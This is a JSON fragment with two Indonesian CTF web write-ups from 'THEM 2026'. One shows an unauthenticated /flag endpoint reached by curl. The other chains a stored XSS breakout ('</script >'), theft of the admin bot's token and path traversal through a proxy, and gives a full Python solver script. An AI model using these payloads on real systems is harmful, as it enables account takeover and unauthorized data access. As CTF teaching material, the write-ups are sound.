    "id": "them2026-web-acutemagical",
    "title": "a Cute Magical Router Gateway",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge a Cute Magical Router Gateway",
    "problemDescription": "Challenge ini berupa aplikasi web router palsu yang dibangun sebagai single page application. Dari halaman utama terlihat hanya ada form login, tetapi bundle JavaScript di sisi client memperlihatkan endpoint backend yang dipakai aplikasi.\n\nFlag ditemukan karena endpoint `/flag` bisa diakses langsung tanpa autentikasi. Jadi proses login hanya membatasi tampilan di browser, bukan benar-benar melindungi data di backend.",
    "tools": [],
    "analysis": "File JavaScript diunduh dan dicari string penting seperti `fetch`, `password`, `flag`, dan `login`:\n\n```bash\ncurl -sS 'http://66ccb9a8-185d-4577-98e8-7851c584ebe8.74.113.234.79.nip.io:8880/assets/index-B3EwX341.js' -o index-B3EwX341.js\nrg -n \"fetch|password|flag|login\" index-B3EwX341.js\n```\n\nDari bundle terlihat alur login aplikasi:\n\n1. User mengisi username dan password.\n2. Browser mengirim request ke `/validate-password`.\n3. Jika respons `success` bernilai `true`, browser mengambil flag dari `/flag`.\n\nPotongan logika pentingnya:\n\n```js\nfetch(\"/validate-password\", {\n  method: \"POST\",\n  headers: { \"Content-Type\": \"application/json\" },\n  body: JSON.stringify({ username, password })\n})\n\nfetch(\"/flag\")\n```\n\nIni memberi petunjuk bahwa flag mungkin tidak benar-benar dikunci oleh session server, karena client langsung memanggil endpoint `/flag` setelah login.",
    "solution": [
      {
        "title": "Target",
        "content": "",
        "code": "http://66ccb9a8-185d-4577-98e8-7851c584ebe8.74.113.234.79.nip.io:8880/"
      },
      {
        "title": "Eksploitasi",
        "content": "Saya coba akses endpoint `/flag` secara langsung:\n\n\n\nTernyata endpoint tersebut langsung mengembalikan flag tanpa cookie, session, bearer token, atau bukti login apa pun:",
        "code": "curl -i -sS 'http://66ccb9a8-185d-4577-98e8-7851c584ebe8.74.113.234.79.nip.io:8880/flag'"
      },
      {
        "title": "Vulnerability",
        "content": "Masalah utamanya adalah broken access control. Backend menyediakan endpoint sensitif `/flag`, tetapi tidak melakukan validasi autentikasi di endpoint tersebut.\n\nForm login hanya dipakai untuk mengubah state di sisi React client. Karena proteksi dilakukan di client, siapa pun tetap bisa memanggil endpoint backend secara langsung dengan `curl`."
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{02783fcd-3d0d-4bd9-843f-b84f73c4c2f4}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-web-meh",
    "title": "Challenge: meh",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge Challenge: meh",
    "problemDescription": "",
    "tools": [],
    "analysis": "Challenge ini terdiri dari tiga komponen utama:\n1. **Web Frontend (Astro)**: Mengelola registrasi, login, profil, dan pengaturan user. Terdapat juga endpoint API untuk proxy ke backend dan mentrigger bot.\n2. **Backend (Go)**: Menyimpan flag dan menyediakan API untuk observasi. Memerlukan token JWT dengan role `admin` untuk mengakses endpoint `/admin/flag`.\n3. **Bot (Puppeteer)**: Bertugas mengunjungi URL yang diberikan user. Bot ini login sebagai `admin` di aplikasi web.",
    "solution": [
      {
        "title": "1. XSS di Halaman Profil",
        "content": "Pada file `web/src/pages/profile/[username].astro`, variabel user diserialisasi ke dalam tag `<script>` menggunakan `define:vars` milik Astro:\n\nMeskipun Astro melakukan escaping terhadap `</script>`, ia tidak menangani variasi seperti `</script >` (dengan spasi). Browser tetap menganggap ini sebagai penutup tag script, sehingga kita bisa melakukan breakout dan menyisipkan script baru.",
        "code": "<script define:vars={{ handle: user.username, signature: user.signature }}>\n  window.MehProfile = { handle, signature };\n</script>"
      },
      {
        "title": "2. SSRF / Path Traversal di API Proxy",
        "content": "Endpoint `/api/proxy` di frontend mengizinkan akses ke backend dengan batasan path harus dimulai dengan `api/observations/`. Namun, karena menggunakan `http.request` tanpa sanitasi path yang ketat, kita bisa menggunakan path traversal (`../`) untuk mencapai endpoint internal lainnya di backend.",
        "code": "if (!path.startsWith('api/observations/')) { ... }\n// ...\nconst reqPath = '/' + path + '?token=' + encodeURIComponent(token || '');"
      },
      {
        "title": "3. Backend Path Normalization Mismatch",
        "content": "Backend di `backend/main.go` melakukan pengecekan prefix `/api/` pada `r.RequestURI` sebelum melakukan pembersihan path menggunakan `path.Clean(r.URL.Path)`.\n\nRequest ke `/api/observations/../../admin/flag` akan lolos pengecekan prefix `/api/` dan setelah dibersihkan akan menjadi `/admin/flag`, yang merupakan endpoint untuk mendapatkan flag.",
        "code": "reqURI := r.RequestURI\n// ...\nif !strings.HasPrefix(originalPath, \"/api/\") { ... }\ncleanPath := path.Clean(r.URL.Path)"
      },
      {
        "title": "Langkah Eksploitasi",
        "content": "1. **Persiapan XSS Payload**:\n   Payload dirancang untuk berjalan di browser Bot (yang login sebagai admin). Script ini akan:\n   - Mengambil token dari halaman `/flag` (halaman khusus admin yang menggenerate token backend).\n   - Mengirimkan token tersebut kembali ke kita dengan cara mengupdate signature profil admin itu sendiri (CSRF ke `/settings`).\n\n   Payload (menggunakan bypass spasi):\n   \n\n2. **Eksekusi**:\n   - Registrasi user baru.\n   - Update signature user tersebut dengan payload XSS di atas.\n   - Kirim URL profil user kita ke `/api/visit` agar dikunjungi oleh Bot.\n   - Tunggu beberapa saat, lalu cek profil `admin` untuk mendapatkan token yang telah dieksfiltrasi.\n\n3. **Pengambilan Flag**:\n   Setelah mendapatkan token JWT admin, gunakan endpoint proxy untuk mengambil flag:\n   `GET /api/proxy?path=api/observations/../../admin/flag&token=<TOKEN_ADMIN>`",
        "code": "</script > <script>\n   fetch('/flag').then(r=>r.text()).then(h=>{\n     const t=h.match(/data-token=.([^.]+)./)[1];\n     var f = document.createElement('form');\n     f.method = 'POST';\n     f.action = '/settings';\n     var i = document.createElement('input');\n     i.name = 'signature';\n     i.value = 'TOKEN:' + t;\n     f.appendChild(i);\n     document.body.appendChild(f);\n     f.submit();\n   });\n   </script >"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "import requests\r\nimport base64\r\nimport re\r\nimport time\r\n\r\nBASE_URL = \"http://45.130.164.173:30205\"\r\n\r\ndef solve():\r\n    s = requests.Session()\r\n    \r\n    # 1. Register\r\n    username = \"attacker_\" + str(int(time.time()))\r\n    print(f\"[*] Registering user: {username}\")\r\n    r = s.post(f\"{BASE_URL}/register\", data={\r\n        \"username\": username,\r\n        \"password\": \"password\"\r\n    }, allow_redirects=True)\r\n    \r\n    # 2. Set XSS payload\r\n    # This payload fetches /flag, extracts the token, and updates the admin's own signature with it.\r\n    # Note: </script > (with a space) bypasses Astro escaping and closes the script block.\r\n    xss_payload = (\r\n        '</script > <script>'\r\n        'fetch(\"/flag\").then(r=>r.text()).then(html=>{'\r\n        '  const m = html.match(/data-token=\"([^\"]+)\"/);'\r\n        '  if (m) {'\r\n        '    const token = m[1];'\r\n        '    const fd = new URLSearchParams();'\r\n        '    fd.append(\"signature\", \"GOT_TOKEN:\" + token);'\r\n        '    fetch(\"/settings\", {method:\"POST\", body:fd});'\r\n        '  }'\r\n        '});'\r\n        '</script >'\r\n    )\r\n    \r\n    print(\"[*] Setting XSS payload in signature\")\r\n    r = s.post(f\"{BASE_URL}/settings\", data={\r\n        \"signature\": xss_payload\r\n    })\r\n    \r\n    # 3. Trigger bot visit\r\n    profile_url = f\"http://web:4321/profile/{username}\"\r\n    print(f\"[*] Triggering bot visit to: {profile_url}\")\r\n    r = s.post(f\"{BASE_URL}/api/visit\", json={\r\n        \"url\": profile_url\r\n    })\r\n    print(f\"[*] Bot response: {r.text}\")\r\n    \r\n    print(\"[*] Waiting for bot to execute payload (15s)...\")\r\n    time.sleep(15)\r\n    \r\n    # 4. Get token from admin's profile\r\n    print(\"[*] Checking admin's profile for token\")\r\n    r = s.get(f\"{BASE_URL}/profile/admin\")\r\n    m = re.search(r\"GOT_TOKEN:([a-zA-Z0-9\\._-]+)\", r.text)\r\n    if not m:\r\n        print(\"[!] Token not found in admin profile. Retrying check...\")\r\n        time.sleep(5)\r\n        r = s.get(f\"{BASE_URL}/profile/admin\")\r\n        m = re.search(r\"GOT_TOKEN:([a-zA-Z0-9\\._-]+)\", r.text)\r\n        \r\n    if m:\r\n        token = m.group(1)\r\n        print(f\"[+] Found token: {token}\")\r\n        \r\n        # 5. Use SSRF/Path Traversal to get flag\r\n        # Proxy path starts with api/observations/\r\n        # Backend check: originalPath.startsWith(\"/api/\")\r\n        # cleanPath: path.Clean(r.URL.Path)\r\n        proxy_path = \"api/observations/../../admin/flag\"\r\n        print(f\"[*] Fetching flag using proxy with path: {proxy_path}\")\r\n        r = s.get(f\"{BASE_URL}/api/proxy\", params={\r\n            \"path\": proxy_path,\r\n            \"token\": token\r\n        })\r\n        print(f\"[+] Backend response: {r.text}\")\r\n        \r\n        if \"THEM\" in r.text:\r\n            flag_match = re.search(r\"THEM\\{.*?\\}\", r.text)\r\n            if flag_match:\r\n                print(f\"\\n<FLAG>{flag_match.group(0)}</FLAG>\")\r\n            else:\r\n                print(f\"\\n<FLAG>{r.text}</FLAG>\")\r\n    else:\r\n        print(\"[!] Failed to get token.\")\r\n        # Debug: Print the admin profile page content\r\n        # print(r.text)\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{an0ther_4noth3r_sh1t_ch4lleng3_f5bc552656c9a3d06c3f890}",
    "lessonsLearned": ""
  }
];
